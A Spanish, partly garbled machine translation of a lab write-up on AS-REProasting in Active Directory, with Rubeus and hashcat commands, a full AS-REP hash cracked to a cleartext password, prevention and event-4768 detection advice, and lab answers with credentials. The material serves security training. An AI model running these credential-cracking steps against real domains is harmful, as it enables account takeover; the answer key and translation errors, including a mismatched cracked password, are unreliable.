# AS-REProasting

# **Descripción**

El `AS-REProasting` El ataque es similar al `Kerberoasting` ataque; Podemos obtener hashshables para cuentas de usuario que tienen la propiedad `Do not require Kerberos preauthentication` activado. El éxito de este ataque depende de la fuerza de la contraseña de la cuenta de usuario que descifraremos.

---

# **Ataque**

Para obtener hashes crujibles, podemos usar `Rubeus` de nuevo. Sin embargo, esta vez, usaremos el `asreproast` acción. Si no especificamos un nombre, `Rubeus` extraerá hash para cada usuario que tenga `Kerberos preauthentication` no requerido:

Asombrado

```powershell
PS C:\Users\bob\Downloads> .\Rubeus.exe asreproast /outfile:asrep.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: AS-REP roasting

[*] Target Domain          : eagle.local

[*] Searching path 'LDAP://DC2.eagle.local/DC=eagle,DC=local' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : anni
[*] DistinguishedName      : CN=anni,OU=EagleUsers,DC=eagle,DC=local
[*] Using domain controller: DC2.eagle.local (172.16.18.4)
[*] Building AS-REQ (w/o preauth) for: 'eagle.local\anni'
[+] AS-REQ w/o preauth successful!
[*] Hash written to C:\Users\bob\Downloads\asrep.txt

[*] Roasted hashes written to : C:\Users\bob\Downloads\asrep.txt

```

![](https://academy.hackthebox.com/storage/modules/176/A2/AsrepReq.png)

Una vez `Rubeus` Obtiene el hash para el usuario Anni (el único en el entorno de juegos con preautenticación no requerida), moveremos el archivo de texto de salida a una máquina de ataque de Linux.

Para `hashcat` Para poder reconocer el hash, necesitamos editarlo agregando `23$` después `$krb5asrep$`:

Asombrado

```
$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c64803358a43d05383e9e01374e8f2b2c92f9d6c669cdc4a1b9c1ed684c7857c965b8e44a285bc0e2f1bc248159aa7448494de4c1f997382518278e375a7a4960153e13dae1cd28d05b7f2377a038062f8e751c1621828b100417f50ce617278747d9af35581e38c381bb0a3ff246912def5dd2d53f875f0a64c46349fdf3d7ed0d8ff5a08f2b78d83a97865a3ea2f873be57f13b4016331eef74e827a17846cb49ccf982e31460ab25c017fd44d46cd8f545db00b6578150a4c59150fbec18f0a2472b18c5123c34e661cc8b52dfee9c93dd86e0afa66524994b04c5456c1e71ccbd2183ba0c43d2550
```

Ahora podemos usar `hashcat` con el modelo hash (opción -m) `18200` para `AS-REPRoastable` hash. También pasamos un archivo de diccionario con contraseñas (el archivo `passwords.txt`) y guarde la salida de cualquier boletos agrietados con éxito al archivo`asrepcracked.txt`:

Asombrado

```
xnoxos@htb[/htb]$ sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --forcehashcat (v6.2.5) starting

<SNIP>

Dictionary cache hit:
* Filename..: passwords.txt
* Passwords.: 10002
* Bytes.....: 76525
* Keyspace..: 10002
* Runtime...: 0 secs

Approaching final keyspace - workload adjusted.

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......:$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013d...3d2550Time.Started.....: Thu Dec 8 06:08:47 2022, (0 secs)
Time.Estimated...: Thu Dec 8 06:08:47 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwords.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   130.2 kH/s (0.65ms) @ Accel:256 Loops:1 Thr:1 Vec:8Recovered........: 1/1 (100.00%) Digests
Progress.........: 10002/10002 (100.00%)
Rejected.........: 0/10002 (0.00%)
Restore.Point....: 9216/10002 (92.14%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidate.Engine.: Device Generator
Candidates.#1....: 20041985 -> bradyHardware.Mon.#1..: Util: 26%Started: Thu Dec 8 06:08:11 2022
Stopped: Thu Dec 8 06:08:49 2022

```

![](https://academy.hackthebox.com/storage/modules/176/A2/AsrepReqCrack.png)

Una vez `hashcat` descifra la contraseña, podemos imprimir el contenido del archivo de salida para obtener la contraseña de ClearText`Slavi123`:

Asombrado

```
xnoxos@htb[/htb]$ sudo cat asrepcrack.txt$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c64803358a43d05383e9e01374e8f2b2c92f9d6c669cdc4a1b9c1ed684c7857c965b8e44a285bc0e2f1bc248159aa7448494de4c1f997382518278e375a7a4960153e13dae1cd28d05b7f2377a038062f8e751c1621828b100417f50ce617278747d9af35581e38c381bb0a3ff246912def5dd2d53f875f0a64c46349fdf3d7ed0d8ff5a08f2b78d83a97865a3ea2f873be57f13b4016331eef74e827a17846cb49ccf982e31460ab25c017fd44d46cd8f545db00b6578150a4c59150fbec18f0a2472b18c5123c34e661cc8b52dfee9c93dd86e0afa66524994b04c5456c1e71ccbd2183ba0c43d2550:Slavi123
```

![](https://academy.hackthebox.com/storage/modules/176/A2/AsrepReqCracked.png)

---

# **Prevención**

Como se mencionó anteriormente, el éxito de este ataque depende de la fuerza de la contraseña de los usuarios con `Do not require Kerberos preauthentication` configurado.

En primer lugar, solo debemos usar esta propiedad si es necesario; Una buena práctica es revisar las cuentas trimestralmente para garantizar que no hayamos asignado esta propiedad. Debido a que esta propiedad a menudo se encuentra con algunas cuentas de usuario regulares, tienden a tener contraseñas más fáciles de obtener que las cuentas de servicio con SPN (las de Kerberoast). Por lo tanto, para los usuarios que requieren esto configurado, debemos asignar una política de contraseña separada, que requiere al menos 20 caracteres para frustrar los intentos de agrietamiento.

---

# **Detección**

Cuando ejecutamos a Rubeus, un evento con ID `4768` fue generado, lo que indica que un `Kerberos Authentication ticket` fue generado:

![](https://academy.hackthebox.com/storage/modules/176/A2/AsrepDetect.png)

La advertencia es que AD genera este evento para cada usuario que se autentica con Kerberos en cualquier dispositivo; Por lo tanto, la presencia de este evento es muy abundante. Sin embargo, es posible saber de dónde se autenticó el usuario, que luego podemos usar para correlacionar buenos inicios de sesión conocidos contra posibles extracciones de hash malicioso. Puede ser difícil inspeccionar direcciones IP específicas, especialmente si un usuario se mueve por las ubicaciones de la oficina. Sin embargo, es posible analizar la VLAN particular y alerta sobre cualquier cosa fuera de él.

---

# **Mielero**

Para este ataque, un `honeypot user` es una excelente opción de detección para configurar en entornos AD; Este debe ser un usuario sin uso/necesidad real en el entorno, de modo que no se realicen intentos de inicio de sesión regularmente. Por lo tanto, cualquier intento de realizar un inicio de sesión para esta cuenta es probablemente maliciosa y requiere inspección.

Sin embargo, supongamos que el usuario de honeypot es la única cuenta con `Kerberos Pre-Authentication not required`. En ese caso, puede haber mejores métodos de detección, ya que sería muy obvio para los actores de amenaza avanzada de que es un usuario de honeypot, lo que resulta en que eviten las interacciones con él. (Anteriormente escuché de una organización que necesitaba una de estas cuentas (relacionadas con la aplicación) que la "seguridad a través de la oscuridad" detrás de tener solo una de estas cuentas puede salvarlas, ya que los atacantes evitarán perseguirlo pensando que es un usuario de honeypot. Si bien puede ser cierto en algunos casos, no debemos dejar que un vistazo a la esperanza dicte el estado de seguridad del medio ambiente).

Para hacer un buen usuario de honeypot, debemos asegurarnos de lo siguiente:

- La cuenta debe ser un usuario relativamente antiguo, idealmente uno que se haya vuelto falso (los actores de amenaza avanzados no solicitarán boletos para nuevas cuentas porque probablemente tengan contraseñas seguras y la posibilidad de ser un usuario de honeypot).
- Para un usuario de la cuenta de servicio, la contraseña debe tener más de dos años. Para los usuarios regulares, mantenga la contraseña para que no sea mayor de un año.
- La cuenta debe tener inicios de sesión después del día en que se cambió la contraseña; De lo contrario, se vuelve evidente si el último día de cambio de contraseña es el mismo que el inicio de sesión anterior.
- La cuenta debe tener algunos privilegios asignados; De lo contrario, no será interesante intentar descifrar el hash de su contraseña.

Si volvemos a nuestro entorno de juegos y configuramos el "SVC-IAM 'del usuario (presumiblemente una antigua cuenta de la cuenta IAM) con las recomendaciones anteriores, entonces cualquier solicitud para obtener un TGT para esa cuenta debe ser alertada. El evento recibido se vería así:

![](https://academy.hackthebox.com/storage/modules/176/A2/honeypot2.png)

### **Preguntas y respuestas**

1) Conéctese al objetivo y realice un ataque de reprovisión. ¿Cuál es la contraseña para el usuario anni?

Comencemos por ejecutar el ataque de tostado asignado para extraer hashes para los usuarios que no requieren la preautenticación de Kerberos.

Copiar

```
.\Rubeus.exe asreproast /outfile:asrep.txt
```

[](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252FKVyM1sIQabuZlPzoagJL%252FScreenshot%2811%29.png%3Falt%3Dmedia%26token%3D8cc45b1a-bd4b-438d-891b-f74258a99d3f&width=768&dpr=4&quality=100&sign=f4c96f04&sv=2)

A continuación, transfiera el archivo asrep.txt a nuestra máquina de ataque.

Copiar

```
smbclient \\\\10.129.204.151\\Share -U eagle/administrator%Slavi123
```

[](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252FkwPZM4hSVxlW1GU3Hjkg%252FScreenshot%2812%29.png%3Falt%3Dmedia%26token%3D7095ae1a-a6c5-43cf-a1f3-7e018ae17a8d&width=768&dpr=4&quality=100&sign=203445d7&sv=2)

Ahora, usemos hashcat para descifrar estos tickets y guardar la salida en el archivo asrepcrack.txt.

Copiar

```
sudo hashcat -m 18200 -a 0 asrep.txt rockyou.txt --outfile asrepcrack.txt --force
```

[](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252FxS2SeSahsA5L1Nev3alu%252FScreenshot%2813%29.png%3Falt%3Dmedia%26token%3D1f2d6fb2-c006-4828-9810-35e3778656e2&width=768&dpr=4&quality=100&sign=89f955cb&sv=2)

[](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252F6rVak4wtcLF26VQcPsua%252FScreenshot%2814%29.png%3Falt%3Dmedia%26token%3Dd828175b-a5bb-4ca3-b8fb-5ca71bc942f2&width=768&dpr=4&quality=100&sign=b7312cb7&sv=2)

Respuesta: Shadow

2) Después de realizar el ataque como la reprimenda, conéctese a DC1 (172.16.18.3) como 'htb-student: htb_@cademy_stdnt!' y mire el espectador de registros en eventos. ¿Cuál es el TargetSid del usuario de SVC-IAM?

Conectemos a DC1 (172.16.18.3) desde nuestra máquina de Windows con escritorio remoto.

[](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252FRxu02YPLX5W9rJRxIpr9%252FScreenshot%2815%29.png%3Falt%3Dmedia%26token%3D8058cc1b-65e5-43cb-b2fb-6e358502a669&width=768&dpr=4&quality=100&sign=c0cbd68&sv=2)

A continuación, abra el visor de eventos y filtre por ID de evento 4768.

[](https://faresbltagy.gitbook.io/~gitbook/image?url=https%3A%2F%2F2537271824-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIswWWP3l0rGuQmG2WUcr%252Fuploads%252F1wU90KKIVs1efGOoBAfM%252FScreenshot%2816%29.png%3Falt%3Dmedia%26token%3Dfd7ad591-3cc1-4e3b-a00c-c57d73d71167&width=768&dpr=4&quality=100&sign=d591fa40&sv=2)

Respuesta: S-1-5-21-1518138621-4282902758-7524445584-3103